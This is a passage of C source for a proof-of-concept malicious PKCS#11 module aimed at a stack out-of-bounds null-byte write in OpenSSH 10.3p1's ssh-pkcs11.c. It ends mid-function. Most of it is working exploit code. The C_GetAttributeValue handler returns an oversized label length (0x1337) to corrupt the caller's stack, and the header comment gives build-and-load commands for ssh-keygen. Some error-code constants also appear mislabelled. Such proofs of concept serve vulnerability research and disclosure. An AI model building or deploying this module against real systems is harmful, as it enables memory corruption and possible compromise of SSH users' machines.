/*
 * OpenSSH 10.3p1 - PKCS#11 Stack OOB Null-byte Write PoC
 * Kenshin Himura of DTrust
 *
 * Target:  ssh-pkcs11.c:1589
 *   label[key_attr[1].ulValueLen] = '\0';
 *
 * When ssh-keygen -D or ssh connects via PKCS#11, it calls
 * C_GetAttributeValue() to fetch CKA_LABEL. A malicious module
 * returns ulValueLen > 255, causing a null byte write past the
 * 256-byte stack buffer label[256].
 *
 * Build & test:
 *   gcc -shared -o evil_pkcs11.so -fPIC evil_pkcs11.c
 *   ssh-keygen -D ./evil_pkcs11.so
 *
 *   cl /LD evil_pkcs11.c /Foevil_pkcs11.dll
 *   ssh-keygen -D .\evil_pkcs11.dll
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

#ifdef _WIN32
#define EXPORT __declspec(dllexport)
#pragma pack(push, 8)
#else
#define EXPORT __attribute__((visibility("default")))
#endif

/* ===== PKCS#11 types ===== */
typedef unsigned long CK_ULONG;
typedef CK_ULONG CK_RV;
typedef CK_ULONG CK_SESSION_HANDLE;
typedef CK_ULONG CK_OBJECT_HANDLE;
typedef CK_ULONG CK_SLOT_ID;
typedef CK_ULONG CK_KEY_TYPE;
typedef CK_ULONG CK_ATTRIBUTE_TYPE;
typedef CK_ULONG CK_FLAGS;
typedef CK_ULONG CK_USER_TYPE;
typedef CK_ULONG CK_MECHANISM_TYPE;
typedef unsigned char CK_BYTE;
typedef unsigned char CK_UTF8CHAR;
typedef void *CK_VOID_PTR;

#define CKR_OK                    0x00000000
#define CKR_GENERAL_ERROR         0x00000005
#define CKR_FUNCTION_FAILED       0x00000006
#define CKR_TOKEN_NOT_PRESENT     0x00000012
#define CKR_SESSION_HANDLE_INVALID 0x00000019
#define CKR_ATTRIBUTE_TYPE_INVALID 0x00000012
#define CKR_FUNCTION_NOT_SUPPORTED 0x00000054
#define CKR_BUFFER_TOO_SMALL      0x00000150
#define CKR_DEVICE_ERROR          0x00000030

#define CKA_CLASS                0x00000000
#define CKA_KEY_TYPE             0x00000100
#define CKA_LABEL                0x00000003
#define CKA_MODULUS              0x00000120
#define CKA_PUBLIC_EXPONENT      0x00000122
#define CKA_ID                   0x00000102

#define CKO_PUBLIC_KEY           0x00000002
#define CKK_RSA                  0x00000000

#define CKF_TOKEN_PRESENT        0x00000001
#define CKF_SERIAL_SESSION       0x00000004
#define CKF_RW_SESSION           0x00000002
#define CK_TRUE                  1
#define CK_FALSE                 0

/* ck_version */
struct ck_version {
    unsigned char major;
    unsigned char minor;
};

/* ck_info */
struct ck_info {
    struct ck_version cryptoki_version;
    unsigned char manufacturer_id[32];
    CK_FLAGS flags;
    unsigned char library_description[32];
    struct ck_version library_version;
};

/* ck_slot_info */
struct ck_slot_info {
    unsigned char slot_description[64];
    unsigned char manufacturer_id[32];
    CK_FLAGS flags;
    struct ck_version hardware_version;
    struct ck_version firmware_version;
};

/* ck_token_info */
struct ck_token_info {
    unsigned char label[32];
    unsigned char manufacturer_id[32];
    unsigned char model[16];
    unsigned char serial_number[16];
    CK_FLAGS flags;
    CK_ULONG max_session_count;
    CK_ULONG session_count;
    CK_ULONG max_rw_session_count;
    CK_ULONG rw_session_count;
    CK_ULONG max_pin_len;
    CK_ULONG min_pin_len;
    CK_ULONG total_public_memory;
    CK_ULONG free_public_memory;
    CK_ULONG total_private_memory;
    CK_ULONG free_private_memory;
    struct ck_version hardware_version;
    struct ck_version firmware_version;
    unsigned char utc_time[16];
};

/* ck_mechanism */
struct ck_mechanism {
    CK_MECHANISM_TYPE mechanism;
    CK_VOID_PTR pParameter;
    CK_ULONG ulParameterLen;
};

/* ck_mechanism_info */
struct ck_mechanism_info {
    CK_ULONG ulMinKeySize;
    CK_ULONG ulMaxKeySize;
    CK_FLAGS flags;
};

/* ck_session_info */
struct ck_session_info {
    CK_SLOT_ID slot_id;
    CK_FLAGS flags;
    unsigned char *pWindow;
};

/* ck_attribute */
struct ck_attribute {
    CK_ATTRIBUTE_TYPE type;
    CK_VOID_PTR pValue;
    CK_ULONG ulValueLen;
};

/*
 * CK_FUNCTION_LIST struct.
 * Must match the layout in pkcs11.h (struct ck_function_list).
 * 1 ck_version + 68 function pointers.
 */
struct ck_function_list {
    struct ck_version version;
    CK_RV (*C_Initialize)(CK_VOID_PTR);
    CK_RV (*C_Finalize)(CK_VOID_PTR);
    CK_RV (*C_GetInfo)(struct ck_info *);
    CK_RV (*C_GetFunctionList)(struct ck_function_list **);
    CK_RV (*C_GetSlotList)(unsigned char, CK_SLOT_ID *, CK_ULONG *);
    CK_RV (*C_GetSlotInfo)(CK_SLOT_ID, struct ck_slot_info *);
    CK_RV (*C_GetTokenInfo)(CK_SLOT_ID, struct ck_token_info *);
    CK_RV (*C_GetMechanismList)(CK_SLOT_ID, CK_MECHANISM_TYPE *, CK_ULONG *);
    CK_RV (*C_GetMechanismInfo)(CK_SLOT_ID, CK_MECHANISM_TYPE, struct ck_mechanism_info *);
    CK_RV (*C_InitToken)(CK_SLOT_ID, unsigned char *, CK_ULONG, unsigned char *);
    CK_RV (*C_InitPIN)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG);
    CK_RV (*C_SetPIN)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG);
    CK_RV (*C_OpenSession)(CK_SLOT_ID, CK_FLAGS, CK_VOID_PTR, CK_VOID_PTR, CK_SESSION_HANDLE *);
    CK_RV (*C_CloseSession)(CK_SESSION_HANDLE);
    CK_RV (*C_CloseAllSessions)(CK_SLOT_ID);
    CK_RV (*C_GetSessionInfo)(CK_SESSION_HANDLE, struct ck_session_info *);
    CK_RV (*C_GetOperationState)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG *);
    CK_RV (*C_SetOperationState)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, CK_OBJECT_HANDLE, CK_OBJECT_HANDLE);
    CK_RV (*C_Login)(CK_SESSION_HANDLE, CK_USER_TYPE, unsigned char *, CK_ULONG);
    CK_RV (*C_Logout)(CK_SESSION_HANDLE);
    CK_RV (*C_CreateObject)(CK_SESSION_HANDLE, struct ck_attribute *, CK_ULONG, CK_OBJECT_HANDLE *);
    CK_RV (*C_CopyObject)(CK_SESSION_HANDLE, CK_OBJECT_HANDLE, struct ck_attribute *, CK_ULONG, CK_OBJECT_HANDLE *);
    CK_RV (*C_DestroyObject)(CK_SESSION_HANDLE, CK_OBJECT_HANDLE);
    CK_RV (*C_GetObjectSize)(CK_SESSION_HANDLE, CK_OBJECT_HANDLE, CK_ULONG *);
    CK_RV (*C_GetAttributeValue)(CK_SESSION_HANDLE, CK_OBJECT_HANDLE, struct ck_attribute *, CK_ULONG);
    CK_RV (*C_SetAttributeValue)(CK_SESSION_HANDLE, CK_OBJECT_HANDLE, struct ck_attribute *, CK_ULONG);
    CK_RV (*C_FindObjectsInit)(CK_SESSION_HANDLE, struct ck_attribute *, CK_ULONG);
    CK_RV (*C_FindObjects)(CK_SESSION_HANDLE, CK_OBJECT_HANDLE *, CK_ULONG, CK_ULONG *);
    CK_RV (*C_FindObjectsFinal)(CK_SESSION_HANDLE);
    CK_RV (*C_EncryptInit)(CK_SESSION_HANDLE, struct ck_mechanism *, CK_OBJECT_HANDLE);
    CK_RV (*C_Encrypt)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_EncryptUpdate)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_EncryptFinal)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG *);
    CK_RV (*C_DecryptInit)(CK_SESSION_HANDLE, struct ck_mechanism *, CK_OBJECT_HANDLE);
    CK_RV (*C_Decrypt)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_DecryptUpdate)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_DecryptFinal)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG *);
    CK_RV (*C_DigestInit)(CK_SESSION_HANDLE, struct ck_mechanism *);
    CK_RV (*C_Digest)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_DigestUpdate)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG);
    CK_RV (*C_DigestKey)(CK_SESSION_HANDLE, CK_OBJECT_HANDLE);
    CK_RV (*C_DigestFinal)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG *);
    CK_RV (*C_SignInit)(CK_SESSION_HANDLE, struct ck_mechanism *, CK_OBJECT_HANDLE);
    CK_RV (*C_Sign)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_SignUpdate)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG);
    CK_RV (*C_SignFinal)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG *);
    CK_RV (*C_SignRecoverInit)(CK_SESSION_HANDLE, struct ck_mechanism *, CK_OBJECT_HANDLE);
    CK_RV (*C_SignRecover)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_VerifyInit)(CK_SESSION_HANDLE, struct ck_mechanism *, CK_OBJECT_HANDLE);
    CK_RV (*C_Verify)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG);
    CK_RV (*C_VerifyUpdate)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG);
    CK_RV (*C_VerifyFinal)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG);
    CK_RV (*C_VerifyRecoverInit)(CK_SESSION_HANDLE, struct ck_mechanism *, CK_OBJECT_HANDLE);
    CK_RV (*C_VerifyRecover)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_DigestEncryptUpdate)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_DecryptDigestUpdate)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_SignEncryptUpdate)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_DecryptVerifyUpdate)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG, unsigned char *, CK_ULONG *);
    CK_RV (*C_GenerateKey)(CK_SESSION_HANDLE, struct ck_mechanism *, struct ck_attribute *, CK_ULONG, CK_OBJECT_HANDLE *);
    CK_RV (*C_GenerateKeyPair)(CK_SESSION_HANDLE, struct ck_mechanism *, struct ck_attribute *, CK_ULONG, struct ck_attribute *, CK_ULONG, CK_OBJECT_HANDLE *, CK_OBJECT_HANDLE *);
    CK_RV (*C_WrapKey)(CK_SESSION_HANDLE, struct ck_mechanism *, CK_OBJECT_HANDLE, CK_OBJECT_HANDLE, unsigned char *, CK_ULONG *);
    CK_RV (*C_UnwrapKey)(CK_SESSION_HANDLE, struct ck_mechanism *, CK_OBJECT_HANDLE, unsigned char *, CK_ULONG, struct ck_attribute *, CK_ULONG, CK_OBJECT_HANDLE *);
    CK_RV (*C_DeriveKey)(CK_SESSION_HANDLE, struct ck_mechanism *, CK_OBJECT_HANDLE, struct ck_attribute *, CK_ULONG, CK_OBJECT_HANDLE *);
    CK_RV (*C_SeedRandom)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG);
    CK_RV (*C_GenerateRandom)(CK_SESSION_HANDLE, unsigned char *, CK_ULONG);
    CK_RV (*C_GetFunctionStatus)(CK_SESSION_HANDLE);
    CK_RV (*C_CancelFunction)(CK_SESSION_HANDLE);
    CK_RV (*C_WaitForSlotEvent)(CK_FLAGS, CK_SLOT_ID *, CK_VOID_PTR);
};

/* ===== Module state ===== */
static CK_BYTE fake_modulus[256];
static int initialized = 0;
static int find_object_count = 0;

/* ===== Forward declarations ===== */
static CK_RV stub_not_supported(void);

/* ===== Stub for functions not implemented ===== */
static CK_RV stub_not_supported(void)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

/* ===== PKCS#11 handler implementations ===== */

static CK_RV impl_C_Initialize(CK_VOID_PTR pInitArgs)
{
    fprintf(stderr, "[evil_pkcs11] C_Initialize\n");
    memset(fake_modulus, 0xFF, sizeof(fake_modulus));
    fake_modulus[0] = 0x00; /* ensure positive bignum */
    initialized = 1;
    return CKR_OK;
}

static CK_RV impl_C_Finalize(CK_VOID_PTR pReserved)
{
    fprintf(stderr, "[evil_pkcs11] C_Finalize\n");
    initialized = 0;
    return CKR_OK;
}

static CK_RV impl_C_GetInfo(struct ck_info *pInfo)
{
    fprintf(stderr, "[evil_pkcs11] C_GetInfo\n");
    memset(pInfo, 0, sizeof(*pInfo));
    pInfo->cryptoki_version.major = 2;
    pInfo->cryptoki_version.minor = 40;
    memcpy(pInfo->manufacturer_id, "evil_pkcs11          ", 32);
    memcpy(pInfo->library_description, "OpenSSH PoC PKCS#11 Module ", 32);
    pInfo->library_version.major = 1;
    pInfo->library_version.minor = 0;
    return CKR_OK;
}

static CK_RV impl_C_GetFunctionList(struct ck_function_list **ppFunctionList)
{
    fprintf(stderr, "[evil_pkcs11] C_GetFunctionList\n");
    if (ppFunctionList == NULL)
        return CKR_GENERAL_ERROR;
    /* Forward declaration of the function list */
    extern struct ck_function_list evil_function_list;
    *ppFunctionList = &evil_function_list;
    return CKR_OK;
}

static CK_RV impl_C_GetSlotList(unsigned char tokenPresent,
    CK_SLOT_ID *pSlotList, CK_ULONG *pulCount)
{
    fprintf(stderr, "[evil_pkcs11] C_GetSlotList\n");
    if (pSlotList == NULL) {
        *pulCount = 1;
    } else {
        if (*pulCount >= 1)
            pSlotList[0] = 0;
        *pulCount = 1;
    }
    return CKR_OK;
}

static CK_RV impl_C_GetSlotInfo(CK_SLOT_ID slotID,
    struct ck_slot_info *pInfo)
{
    fprintf(stderr, "[evil_pkcs11] C_GetSlotInfo slot=%lu\n",
        (unsigned long)slotID);
    memset(pInfo, 0, sizeof(*pInfo));
    memcpy(pInfo->slot_description,
        "Evil PKCS#11 Slot      ", 64);
    memcpy(pInfo->manufacturer_id,
        "evil_pkcs11              ", 32);
    pInfo->flags = CKF_TOKEN_PRESENT;
    return CKR_OK;
}

static CK_RV impl_C_GetTokenInfo(CK_SLOT_ID slotID,
    struct ck_token_info *pInfo)
{
    fprintf(stderr, "[evil_pkcs11] C_GetTokenInfo slot=%lu\n",
        (unsigned long)slotID);
    memset(pInfo, 0, sizeof(*pInfo));
    memcpy(pInfo->label, "Evil Token           ", 32);
    memcpy(pInfo->model, "1337", 16);
    memcpy(pInfo->serial_number, "DEADBEEF", 16);
    pInfo->flags = CKF_TOKEN_PRESENT;
    pInfo->max_session_count = 1;
    pInfo->session_count = 0;
    pInfo->max_pin_len = 64;
    pInfo->min_pin_len = 0;
    pInfo->total_public_memory = 65536;
    pInfo->free_public_memory = 65536;
    return CKR_OK;
}

static CK_RV impl_C_GetMechanismList(CK_SLOT_ID slotID,
    CK_MECHANISM_TYPE *pMechList, CK_ULONG *pulCount)
{
    if (pMechList == NULL)
        *pulCount = 0;
    else
        *pulCount = 0;
    return CKR_OK;
}

static CK_RV impl_C_GetMechanismInfo(CK_SLOT_ID slotID,
    CK_MECHANISM_TYPE type, struct ck_mechanism_info *pInfo)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_InitToken(CK_SLOT_ID slotID,
    unsigned char *pPin, CK_ULONG ulPinLen, unsigned char *pLabel)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_InitPIN(CK_SESSION_HANDLE hSession,
    unsigned char *pPin, CK_ULONG ulPinLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_SetPIN(CK_SESSION_HANDLE hSession,
    unsigned char *pOldPin, CK_ULONG ulOldLen,
    unsigned char *pNewPin, CK_ULONG ulNewLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_OpenSession(CK_SLOT_ID slotID, CK_FLAGS flags,
    CK_VOID_PTR pApplication, CK_VOID_PTR pNotify,
    CK_SESSION_HANDLE *phSession)
{
    fprintf(stderr, "[evil_pkcs11] C_OpenSession slot=%lu\n",
        (unsigned long)slotID);
    *phSession = 1;
    find_object_count = 0;
    return CKR_OK;
}

static CK_RV impl_C_CloseSession(CK_SESSION_HANDLE hSession)
{
    return CKR_OK;
}

static CK_RV impl_C_CloseAllSessions(CK_SLOT_ID slotID)
{
    return CKR_OK;
}

static CK_RV impl_C_GetSessionInfo(CK_SESSION_HANDLE hSession,
    struct ck_session_info *pInfo)
{
    memset(pInfo, 0, sizeof(*pInfo));
    return CKR_OK;
}

static CK_RV impl_C_GetOperationState(CK_SESSION_HANDLE hSession,
    unsigned char *pOperationState, CK_ULONG *pulOperationStateLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_SetOperationState(CK_SESSION_HANDLE hSession,
    unsigned char *pOperationState, CK_ULONG ulOperationStateLen,
    CK_OBJECT_HANDLE hEncryptionKey, CK_OBJECT_HANDLE hAuthenticationKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_Login(CK_SESSION_HANDLE hSession,
    CK_USER_TYPE userType, unsigned char *pPin, CK_ULONG ulPinLen)
{
    fprintf(stderr, "[evil_pkcs11] C_Login (accepting any PIN)\n");
    return CKR_OK;
}

static CK_RV impl_C_Logout(CK_SESSION_HANDLE hSession)
{
    return CKR_OK;
}

static CK_RV impl_C_CreateObject(CK_SESSION_HANDLE hSession,
    struct ck_attribute *pTemplate, CK_ULONG ulCount,
    CK_OBJECT_HANDLE *phObject)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_CopyObject(CK_SESSION_HANDLE hSession,
    CK_OBJECT_HANDLE hObject, struct ck_attribute *pTemplate,
    CK_ULONG ulCount, CK_OBJECT_HANDLE *phNewObject)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DestroyObject(CK_SESSION_HANDLE hSession,
    CK_OBJECT_HANDLE hObject)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_GetObjectSize(CK_SESSION_HANDLE hSession,
    CK_OBJECT_HANDLE hObject, CK_ULONG *pulSize)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

/*
 * VULNERABILITY TRIGGER
 *
 * ssh-pkcs11.c calls C_GetAttributeValue to fetch CKA_LABEL.
 * On the first call (pValue == NULL), it queries the size.
 * The code sets ulValueLen = sizeof(label) - 1 = 255 initially.
 * We return ulValueLen = 0x1337, which is much larger than 255.
 *
 * On the second call, pValue points to a 256-byte stack buffer.
 * The code then does label[ulValueLen] = '\0' at line 1589,
 * writing a null byte at label[0x1337] — far past the buffer.
 */
static CK_RV impl_C_GetAttributeValue(CK_SESSION_HANDLE hSession,
    CK_OBJECT_HANDLE hObject, struct ck_attribute *pTemplate,
    CK_ULONG ulCount)
{
    CK_ULONG i;

    fprintf(stderr, "[evil_pkcs11] C_GetAttributeValue obj=0x%lx count=%lu\n",
        (unsigned long)hObject, (unsigned long)ulCount);

    for (i = 0; i < ulCount; i++) {
        switch (pTemplate[i].type) {
        case CKA_CLASS:
            fprintf(stderr, "[evil_pkcs11]   attr CKA_CLASS\n");
            if (pTemplate[i].pValue) {
                if (pTemplate[i].ulValueLen >= sizeof(CK_ULONG))
                    *(CK_ULONG *)pTemplate[i].pValue = CKO_PUBLIC_KEY;
            }
            pTemplate[i].ulValueLen = sizeof(CK_ULONG);
            break;

        case CKA_KEY_TYPE:
            fprintf(stderr, "[evil_pkcs11]   attr CKA_KEY_TYPE\n");
            if (pTemplate[i].pValue) {
                if (pTemplate[i].ulValueLen >= sizeof(CK_ULONG))
                    *(CK_ULONG *)pTemplate[i].pValue = CKK_RSA;
            }
            pTemplate[i].ulValueLen = sizeof(CK_ULONG);
            break;

        case CKA_LABEL:
            fprintf(stderr, "[evil_pkcs11]   attr CKA_LABEL"
                " (pValue=%p ulValueLen=%lu)\n",
                pTemplate[i].pValue, (unsigned long)pTemplate[i].ulValueLen);
            /*
             * VULNERABILITY TRIGGER
             *
             * ssh-pkcs11.c:1580-1589:
             *   key_attr[1].pValue = &label;           // label[256] stack buf
             *   key_attr[1].ulValueLen = sizeof(label) - 1;  // = 255
             *   rv = f->C_GetAttributeValue(..., key_attr, 2);
             *   label[key_attr[1].ulValueLen] = '\0';  // line 1589
             *
             * After C_GetAttributeValue returns, ulValueLen
             * contains whatever we write. We return 0x1337.
             * Then label[0x1337] = '\0' writes a null byte
             * at stack offset 0x1337 from label[256].
             *
             * This can corrupt saved RBP/return address or
             * trigger __stack_chk_fail with stack canaries.
             */
            if (pTemplate[i].pValue) {
                /* Fill buffer with valid-looking data */
                CK_UTF8CHAR *buf = (CK_UTF8CHAR *)pTemplate[i].pValue;
                CK_ULONG len = pTemplate[i].ulValueLen;
                if (len > 0) {
                    memset(buf, 'A', len - 1);
                    buf[len - 1] = '\0';
                }
                /* Return oversized length -> triggers OOB at line 1589 */
                pTemplate[i].ulValueLen = 0x1337;
            } else {
                /* pValue == NULL: query size, also return oversized */
                pTemplate[i].ulValueLen = 0x1337;
            }
            fprintf(stderr, "[evil_pkcs11]   -> returning ulValueLen=0x%lx\n",
                (unsigned long)pTemplate[i].ulValueLen);
            break;

        case CKA_MODULUS:
            fprintf(stderr, "[evil_pkcs11]   attr CKA_MODULUS\n");
            if (pTemplate[i].pValue) {
                CK_ULONG copy_len = pTemplate[i].ulValueLen;
                if (copy_len > sizeof(fake_modulus))
                    copy_len = sizeof(fake_modulus);
                memcpy(pTemplate[i].pValue, fake_modulus, copy_len);
            }
            pTemplate[i].ulValueLen = sizeof(fake_modulus);
            break;

        case CKA_PUBLIC_EXPONENT:
            fprintf(stderr, "[evil_pkcs11]   attr CKA_PUBLIC_EXPONENT\n");
            if (pTemplate[i].pValue) {
                static CK_BYTE exp[4] = {0x01, 0x00, 0x01, 0x00};
                CK_ULONG copy_len = pTemplate[i].ulValueLen;
                if (copy_len > sizeof(exp))
                    copy_len = sizeof(exp);
                memcpy(pTemplate[i].pValue, exp, copy_len);
            }
            pTemplate[i].ulValueLen = 4;
            break;

        case CKA_ID:
            fprintf(stderr, "[evil_pkcs11]   attr CKA_ID\n");
            if (pTemplate[i].pValue) {
                if (pTemplate[i].ulValueLen > 0)
                    *(CK_BYTE *)pTemplate[i].pValue = 0x01;
            }
            pTemplate[i].ulValueLen = 1;
            break;

        default:
            fprintf(stderr, "[evil_pkcs11]   attr type=0x%lx (unsupported)\n",
                (unsigned long)pTemplate[i].type);
            pTemplate[i].ulValueLen = 0;
            break;
        }
    }
    return CKR_OK;
}

static CK_RV impl_C_SetAttributeValue(CK_SESSION_HANDLE hSession,
    CK_OBJECT_HANDLE hObject, struct ck_attribute *pTemplate,
    CK_ULONG ulCount)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_FindObjectsInit(CK_SESSION_HANDLE hSession,
    struct ck_attribute *pTemplate, CK_ULONG ulCount)
{
    fprintf(stderr, "[evil_pkcs11] C_FindObjectsInit count=%lu\n",
        (unsigned long)ulCount);
    find_object_count = 0;
    return CKR_OK;
}

static CK_RV impl_C_FindObjects(CK_SESSION_HANDLE hSession,
    CK_OBJECT_HANDLE *phObject, CK_ULONG ulMaxObjectCount,
    CK_ULONG *pulObjectCount)
{
    fprintf(stderr, "[evil_pkcs11] C_FindObjects\n");
    if (find_object_count < 1) {
        phObject[0] = 0x42;
        *pulObjectCount = 1;
        find_object_count++;
    } else {
        *pulObjectCount = 0;
    }
    return CKR_OK;
}

static CK_RV impl_C_FindObjectsFinal(CK_SESSION_HANDLE hSession)
{
    return CKR_OK;
}

static CK_RV impl_C_EncryptInit(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, CK_OBJECT_HANDLE hKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_Encrypt(CK_SESSION_HANDLE hSession,
    unsigned char *pData, CK_ULONG ulDataLen,
    unsigned char *pEncryptedData, CK_ULONG *pulEncryptedDataLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_EncryptUpdate(CK_SESSION_HANDLE hSession,
    unsigned char *pPart, CK_ULONG ulPartLen,
    unsigned char *pEncryptedPart, CK_ULONG *pulEncryptedPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_EncryptFinal(CK_SESSION_HANDLE hSession,
    unsigned char *pLastEncryptedPart, CK_ULONG *pulLastEncryptedPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DecryptInit(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, CK_OBJECT_HANDLE hKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_Decrypt(CK_SESSION_HANDLE hSession,
    unsigned char *pEncryptedData, CK_ULONG ulEncryptedDataLen,
    unsigned char *pData, CK_ULONG *pulDataLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DecryptUpdate(CK_SESSION_HANDLE hSession,
    unsigned char *pEncryptedPart, CK_ULONG ulEncryptedPartLen,
    unsigned char *pPart, CK_ULONG *pulPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DecryptFinal(CK_SESSION_HANDLE hSession,
    unsigned char *pLastPart, CK_ULONG *pulLastPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DigestInit(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_Digest(CK_SESSION_HANDLE hSession,
    unsigned char *pData, CK_ULONG ulDataLen,
    unsigned char *pDigest, CK_ULONG *pulDigestLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DigestUpdate(CK_SESSION_HANDLE hSession,
    unsigned char *pPart, CK_ULONG ulPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DigestKey(CK_SESSION_HANDLE hSession,
    CK_OBJECT_HANDLE hKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DigestFinal(CK_SESSION_HANDLE hSession,
    unsigned char *pDigest, CK_ULONG *pulDigestLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_SignInit(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, CK_OBJECT_HANDLE hKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_Sign(CK_SESSION_HANDLE hSession,
    unsigned char *pData, CK_ULONG ulDataLen,
    unsigned char *pSignature, CK_ULONG *pulSignatureLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_SignUpdate(CK_SESSION_HANDLE hSession,
    unsigned char *pPart, CK_ULONG ulPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_SignFinal(CK_SESSION_HANDLE hSession,
    unsigned char *pSignature, CK_ULONG *pulSignatureLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_SignRecoverInit(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, CK_OBJECT_HANDLE hKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_SignRecover(CK_SESSION_HANDLE hSession,
    unsigned char *pData, CK_ULONG ulDataLen,
    unsigned char *pSignature, CK_ULONG *pulSignatureLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_VerifyInit(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, CK_OBJECT_HANDLE hKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_Verify(CK_SESSION_HANDLE hSession,
    unsigned char *pData, CK_ULONG ulDataLen,
    unsigned char *pSignature, CK_ULONG ulSignatureLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_VerifyUpdate(CK_SESSION_HANDLE hSession,
    unsigned char *pPart, CK_ULONG ulPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_VerifyFinal(CK_SESSION_HANDLE hSession,
    unsigned char *pSignature, CK_ULONG ulSignatureLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_VerifyRecoverInit(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, CK_OBJECT_HANDLE hKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_VerifyRecover(CK_SESSION_HANDLE hSession,
    unsigned char *pSignature, CK_ULONG ulSignatureLen,
    unsigned char *pData, CK_ULONG *pulDataLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DigestEncryptUpdate(CK_SESSION_HANDLE hSession,
    unsigned char *pPart, CK_ULONG ulPartLen,
    unsigned char *pEncryptedPart, CK_ULONG *pulEncryptedPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DecryptDigestUpdate(CK_SESSION_HANDLE hSession,
    unsigned char *pEncryptedPart, CK_ULONG ulEncryptedPartLen,
    unsigned char *pPart, CK_ULONG *pulPartLen)
{
